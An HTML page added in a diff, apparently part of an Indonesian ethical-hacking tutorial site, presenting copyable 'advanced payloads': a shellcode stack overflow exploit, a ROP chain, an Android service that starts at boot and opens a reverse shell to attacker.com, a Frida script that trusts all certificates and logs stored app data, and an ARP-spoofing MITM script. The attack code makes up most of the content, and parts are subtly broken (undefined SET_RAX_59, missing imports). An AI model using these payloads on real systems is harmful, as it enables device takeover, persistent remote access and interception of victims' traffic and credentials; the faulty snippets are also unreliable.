@@ -1,0 +1,664 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Advanced Payloads - Exploitation Techniques</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: #333;
+            line-height: 1.6;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        header {
+            text-align: center;
+            color: white;
+            margin-bottom: 40px;
+            animation: slideDown 0.6s ease-out;
+        }
+
+        header h1 {
+            font-size: 3em;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+
+        header p {
+            font-size: 1.2em;
+            opacity: 0.9;
+        }
+
+        .main-menu {
+            margin-top: 20px;
+        }
+
+        .main-menu ul {
+            list-style: none;
+            display: flex;
+            gap: 20px;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+
+        .main-menu a {
+            color: white;
+            text-decoration: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            background: rgba(255, 255, 255, 0.1);
+            transition: all 0.3s ease;
+            font-weight: 500;
+            border: 2px solid transparent;
+        }
+
+        .main-menu a:hover {
+            background: rgba(255, 255, 255, 0.2);
+            border-color: white;
+            transform: translateY(-2px);
+        }
+
+        .payload-container {
+            background: white;
+            border-radius: 10px;
+            padding: 25px;
+            margin: 20px 0;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            animation: fadeIn 0.6s ease-out;
+        }
+
+        .payload-title {
+            color: #667eea;
+            font-size: 1.8em;
+            margin-bottom: 20px;
+            border-bottom: 3px solid #764ba2;
+            padding-bottom: 10px;
+        }
+
+        .payload-category {
+            margin: 30px 0;
+            padding: 20px;
+            background: #f8f9fa;
+            border-radius: 8px;
+            border-left: 4px solid #F44336;
+        }
+
+        .payload-category h3 {
+            color: #F44336;
+            margin-bottom: 15px;
+            font-size: 1.3em;
+        }
+
+        .payload-item {
+            background: white;
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 8px;
+            border-left: 4px solid #FF9800;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+
+        .payload-item h4 {
+            color: #667eea;
+            margin-bottom: 12px;
+            font-size: 1.15em;
+        }
+
+        .payload-description {
+            color: #666;
+            margin: 12px 0;
+            font-size: 0.95em;
+            line-height: 1.6;
+        }
+
+        .code-block {
+            background: #1e1e1e;
+            color: #d4d4d4;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 15px 0;
+            overflow-x: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 0.85em;
+            line-height: 1.5;
+            border-left: 3px solid #4CAF50;
+            position: relative;
+        }
+
+        .copy-btn {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            padding: 5px 10px;
+            background: #667eea;
+            color: white;
+            border: none;
+            border-radius: 3px;
+            cursor: pointer;
+            font-size: 0.8em;
+            transition: all 0.3s ease;
+        }
+
+        .copy-btn:hover {
+            background: #764ba2;
+        }
+
+        .explanation {
+            background: #e8f5e9;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 15px 0;
+            border-left: 3px solid #4CAF50;
+            color: #2e7d32;
+            font-size: 0.95em;
+        }
+
+        .warning {
+            background: #fff3e0;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 15px 0;
+            border-left: 3px solid #FF9800;
+            color: #e65100;
+            font-size: 0.95em;
+        }
+
+        .mitigation {
+            background: #e1f5fe;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 15px 0;
+            border-left: 3px solid #2196F3;
+            color: #01579b;
+            font-size: 0.95em;
+        }
+
+        .key-features {
+            background: #f3e5f5;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 15px 0;
+            border-left: 3px solid #9c27b0;
+            color: #4a148c;
+            font-size: 0.95em;
+        }
+
+        .key-features ul {
+            list-style: none;
+            padding: 0;
+            margin: 10px 0;
+        }
+
+        .key-features li {
+            padding: 8px 0;
+            padding-left: 20px;
+            position: relative;
+        }
+
+        .key-features li:before {
+            content: "●";
+            position: absolute;
+            left: 0;
+            color: #9c27b0;
+        }
+
+        .comparison-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 20px;
+            margin: 20px 0;
+        }
+
+        .comparison-card {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 8px;
+            border-left: 4px solid #667eea;
+        }
+
+        .comparison-card h4 {
+            color: #667eea;
+            margin-bottom: 15px;
+            font-weight: bold;
+        }
+
+        .comparison-card ul {
+            list-style: none;
+            padding: 0;
+        }
+
+        .comparison-card li {
+            padding: 8px 0;
+            padding-left: 20px;
+            position: relative;
+            color: #666;
+            font-size: 0.9em;
+        }
+
+        .comparison-card li:before {
+            content: "✓";
+            position: absolute;
+            left: 0;
+            color: #4CAF50;
+            font-weight: bold;
+        }
+
+        @keyframes slideDown {
+            from {
+                opacity: 0;
+                transform: translateY(-30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        footer {
+            text-align: center;
+            color: white;
+            margin-top: 40px;
+            padding: 20px;
+            border-top: 1px solid rgba(255,255,255,0.3);
+        }
+
+        .toc-section {
+            background: white;
+            border-radius: 10px;
+            padding: 25px;
+            margin: 20px 0;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+        }
+
+        .toc-section h2 {
+            color: #667eea;
+            margin-bottom: 20px;
+        }
+
+        .toc-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 15px;
+        }
+
+        .toc-item {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+            border-left: 4px solid #667eea;
+        }
+
+        .toc-item h4 {
+            color: #667eea;
+            margin-bottom: 8px;
+        }
+
+        .toc-item p {
+            color: #666;
+            font-size: 0.9em;
+        }
+
+        @media (max-width: 768px) {
+            header h1 {
+                font-size: 2em;
+            }
+
+            .comparison-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>💣 Advanced Payloads</h1>
+            <p>Koleksi Lengkap Payload Advanced untuk Penetration Testing</p>
+            
+            <nav class="main-menu">
+                <ul>
+                    <li><a href="index.html">Home</a></li>
+                    <li><a href="osi-layer.html">OSI Layer</a></li>
+                    <li><a href="tools-ethical-hacking.html">Tools</a></li>
+                    <li><a href="payloads-advanced.html">Advanced Payloads</a></li>
+                </ul>
+            </nav>
+        </header>
+
+        <!-- TABLE OF CONTENTS -->
+        <section class="toc-section">
+            <h2>📋 Daftar Payload Advanced</h2>
+            <div class="toc-grid">
+                <div class="toc-item">
+                    <h4>🔨 Binary Exploitation</h4>
+                    <p>Buffer Overflow, ROP, Heap Exploitation, Format String</p>
+                </div>
+                <div class="toc-item">
+                    <h4>📱 Mobile Payloads</h4>
+                    <p>Android, iOS, APK Injection, Frida Scripts</p>
+                </div>
+                <div class="toc-item">
+                    <h4>🌐 Network Attacks</h4>
+                    <p>MITM, ARP Spoofing, DNS Hijacking, VPN Exploitation</p>
+                </div>
+                <div class="toc-item">
+                    <h4>☁️ Cloud Exploitation</h4>
+                    <p>AWS, Azure, GCP Misconfigurations, Container Escape</p>
+                </div>
+                <div class="toc-item">
+                    <h4>🔐 Cryptography Attacks</h4>
+                    <p>RSA Attacks, Weak Encryption, Side-Channel Attacks</p>
+                </div>
+                <div class="toc-item">
+                    <h4>🤖 IoT/Hardware</h4>
+                    <p>Firmware Exploitation, Hardware Hacking, UART Access</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- BINARY EXPLOITATION -->
+        <section class="payload-container">
+            <h2 class="payload-title">🔨 Binary Exploitation Payloads</h2>
+
+            <!-- Buffer Overflow -->
+            <div class="payload-category">
+                <h3>Buffer Overflow & Stack Smashing</h3>
+
+                <div class="payload-item">
+                    <h4>1. Classic Stack Buffer Overflow (x86)</h4>
+                    <p class="payload-description">Exploit buffer overflow untuk overwrite return address dan redirect execution flow.</p>
+
+                    <div class="code-block">
+                        <button class="copy-btn">Copy</button>
+                        <code>#!/usr/bin/env python3
+import struct
+import sys
+
+# Vulnerable program: ./vuln "AAAA...AAAA"
+# void vulnerable_function(char *input) {
+#     char buffer[64];
+#     strcpy(buffer, input);  // NO BOUNDS CHECK!
+# }
+
+# Calculate offset to return address
+BUFFER_SIZE = 64
+SAVED_EBP_SIZE = 4
+OFFSET_TO_EIP = BUFFER_SIZE + SAVED_EBP_SIZE  # 68 bytes
+
+# Target shell code (execve /bin/sh)
+SHELLCODE = b"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
+
+# Address to return to (depends on ASLR)
+RETURN_ADDRESS = 0xbffff2e0  # Example: Stack address where shellcode will be
+
+# Build exploit payload
+payload = b"A" * OFFSET_TO_EIP  # Padding
+payload += struct.pack("<I", RETURN_ADDRESS)  # Overwrite EIP with shellcode address
+payload += SHELLCODE  # Actual shellcode
+
+print(payload)</code>
+                    </div>
+
+                    <div class="explanation">
+                        <strong>📖 Cara Kerja:</strong>
+                        <ul style="margin-top: 8px; margin-left: 20px;">
+                            <li><strong>Stack Layout:</strong> [Buffer (64B)] [EBP (4B)] [EIP/Return Address (4B)]</li>
+                            <li><strong>strcpy():</strong> Tidak mengecek bounds, menerima input unlimited</li>
+                            <li><strong>Padding:</strong> 'A' diisi hingga offset EIP</li>
+                            <li><strong>EIP Overwrite:</strong> Menulis address shellcode ke EIP</li>
+                            <li><strong>Shellcode Execution:</strong> Saat function return, CPU jump ke shellcode</li>
+                        </ul>
+                    </div>
+
+                    <div class="warning">
+                        <strong>⚠️ Modern Mitigations (Bypassable):</strong> ASLR, DEP/NX, Stack Canaries, CFI
+                    </div>
+                </div>
+
+                <!-- ROP Gadget -->
+                <div class="payload-item">
+                    <h4>2. Return-Oriented Programming (ROP) Gadget Chain</h4>
+                    <p class="payload-description">Execute code tanpa injecting new code, menggunakan existing code fragments (gadgets).</p>
+
+                    <div class="code-block">
+                        <button class="copy-btn">Copy</button>
+                        <code>#!/usr/bin/env python3
+# ROP Gadgets: pop rdi; ret (0x400000)
+#              pop rsi; ret (0x400010)  
+#              pop rdx; ret (0x400020)
+#              syscall     (0x400030)
+
+# x86-64 syscall for execve("/bin/sh", NULL, NULL)
+# rax = 59 (execve)
+# rdi = "/bin/sh" 
+# rsi = NULL
+# rdx = NULL
+
+GADGET_POP_RDI = 0x400000
+GADGET_POP_RSI = 0x400010
+GADGET_POP_RDX = 0x400020
+GADGET_SYSCALL = 0x400030
+
+BINSH_STRING_ADDR = 0x600000  # Where "/bin/sh\x00" is located
+
+payload = b'A' * 112  # Padding to RIP
+
+# First gadget: pop rdi; ret
+payload += struct.pack("<Q", GADGET_POP_RDI)
+payload += struct.pack("<Q", BINSH_STRING_ADDR)  # rdi = "/bin/sh"
+
+# Second gadget: pop rsi; ret  
+payload += struct.pack("<Q", GADGET_POP_RSI)
+payload += struct.pack("<Q", 0)  # rsi = NULL
+
+# Third gadget: pop rdx; ret
+payload += struct.pack("<Q", GADGET_POP_RDX)
+payload += struct.pack("<Q", 0)  # rdx = NULL
+
+# Set rax to 59 (execve)
+payload += struct.pack("<Q", SET_RAX_59)  
+
+# Execute syscall
+payload += struct.pack("<Q", GADGET_SYSCALL)
+
+print(payload)</code>
+                    </div>
+
+                    <div class="key-features">
+                        <h4>Keuntungan ROP:</h4>
+                        <ul>
+                            <li>Bypass DEP/NX (tidak inject shellcode ke memory executable)</li>
+                            <li>Gunakan code yang sudah ada di binary</li>
+                            <li>Kompleks tapi powerful</li>
+                            <li>Tools: ropper, ROPgadget untuk find gadgets</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- MOBILE PAYLOADS -->
+        <section class="payload-container">
+            <h2 class="payload-title">📱 Mobile Exploitation Payloads</h2>
+
+            <div class="payload-category">
+                <h3>Android Payloads & Exploitation</h3>
+
+                <div class="payload-item">
+                    <h4>1. Android Reverse Shell via Intent Broadcast</h4>
+                    <p class="payload-description">Inject malicious intent untuk execute command sebagai target app.</p>
+
+                    <div class="code-block">
+                        <button class="copy-btn">Copy</button>
+                        <code>// Malicious Android Service
+package com.evil.app;
+import android.app.Service;
+import android.content.Intent;
+import java.io.IOException;
+
+public class MaliciousService extends Service {
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {
+        try {
+            // Execute reverse shell
+            String cmd = "bash -i >& /dev/tcp/attacker.com/4444 0>&1";
+            Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "-c", cmd});
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+        return START_STICKY;
+    }
+}
+
+// AndroidManifest.xml entry
+<service android:name=".MaliciousService">
+    <intent-filter>
+        <action android:name="android.intent.action.BOOT_COMPLETED" />
+    </intent-filter>
+</service></code>
+                    </div>
+
+                    <div class="explanation">
+                        <strong>📖 Cara Kerja:</strong>
+                        <ul style="margin-top: 8px; margin-left: 20px;">
+                            <li><strong>BOOT_COMPLETED Intent:</strong> Service auto-start saat device boot</li>
+                            <li><strong>Runtime.exec():</strong> Execute shell command</li>
+                            <li><strong>Reverse Shell:</strong> Koneksi balik ke attacker port</li>
+                            <li><strong>Persistent:</strong> Akan selalu run saat device boot</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="payload-item">
+                    <h4>2. Frida Script untuk Hook Android Functions</h4>
+                    <p class="payload-description">Runtime instrumentation untuk hook dan bypass security checks.</p>
+
+                    <div class="code-block">
+                        <button class="copy-btn">Copy</button>
+                        <code>// Frida script - hook_ssl.js
+Java.perform(function() {
+    // Hook SSLContext getInstance
+    var SSLContext = Java.use("javax.net.ssl.SSLContext");
+    var init = SSLContext.init.overload(
+        '[Ljavax/net/ssl/KeyManager;',
+        '[Ljavax/net/ssl/TrustManager;',
+        'java.security.SecureRandom'
+    );
+    
+    init.implementation = function(keyManagers, trustManagers, secureRandom) {
+        console.log("[*] SSLContext.init() called - Trusting all certificates");
+        
+        // Create custom TrustManager that trusts everything
+        var TrustManager = Java.use("javax.net.ssl.X509TrustManager");
+        var AllTrustManager = Java.registerClass({
+            name: "com.example.AllTrustManager",
+            implements: [TrustManager],
+            methods: {
+                checkClientTrusted: function(chain, authType) {},
+                checkServerTrusted: function(chain, authType) {},
+                getAcceptedIssuers: function() { return []; }
+            }
+        });
+        
+        var trustAll = [AllTrustManager.$new()];
+        return init.call(this, keyManagers, trustAll, secureRandom);
+    };
+    
+    // Hook SharedPreferences
+    var SharedPreferences = Java.use("android.content.SharedPreferences");
+    var getString = SharedPreferences.getString.overload('java.lang.String', 'java.lang.String');
+    
+    getString.implementation = function(key, defValue) {
+        var result = getString.call(this, key, defValue);
+        console.log("[*] SharedPreferences.getString('" + key + "') = " + result);
+        return result;
+    };
+});
+
+// Usage: frida -U -f com.target.app -l hook_ssl.js</code>
+                    </div>
+
+                    <div class="key-features">
+                        <h4>Frida Capabilities:</h4>
+                        <ul>
+                            <li>Hook Java methods at runtime</li>
+                            <li>Bypass SSL pinning</li>
+                            <li>Intercept sensitive data access</li>
+                            <li>Modify function behavior dynamically</li>
+                            <li>No app recompilation needed</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- NETWORK ATTACKS -->
+        <section class="payload-container">
+            <h2 class="payload-title">🌐 Network Attack Payloads</h2>
+
+            <div class="payload-category">
+                <h3>Man-in-the-Middle (MITM) Attacks</h3>
+
+                <div class="payload-item">
+                    <h4>1. ARP Spoofing + DNS Hijacking</h4>
+                    <p class="payload-description">Redirect traffic to attacker untuk MITM dan credential stealing.</p>
+
+                    <div class="code-block">
+                        <button class="copy-btn">Copy</button>
+                        <code># 1. ARP Spoofing Script
+#!/usr/bin/env python3
+from scapy.all import ARP, send, get_if_hwaddr
+import time
+
+def get_mac(ip):
+    arp_request = ARP(pdst=ip)
+    arp_response = sr1(arp_request, verbose=False)
+    return arp_response.hwsrc if arp_response else None
+
+def arp_spoof(target_ip, spoof_ip):
+    target_mac = get_mac(target_ip)
+    packet = ARP(op="is-at", pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    send(packet, verbose=False)
+
+# Spoof both directions untuk intercept traffic
+target_ip = "192.168.1.50"
+gateway_ip = "192.168.1.1"
+attacker_ip = "192.168.1.100"
+
+try:
+    while True:
+        arp_spoof(target_ip, gateway_ip)  # Tell target: gateway_ip = attacker_mac
+        arp_spoof(gateway_ip, target_ip)  # Tell gateway: target_ip = attacker_mac
+        time.sleep(2)
+except KeyboardInterrupt:
+    print("Stopped spoofing")
+
+# 2. DNS Hijacking
+# After ARP spoof, intercept DNS requests with Scapy/Netfilter
+# Redirect specific domains ke attacker server</code>
+                    </div>
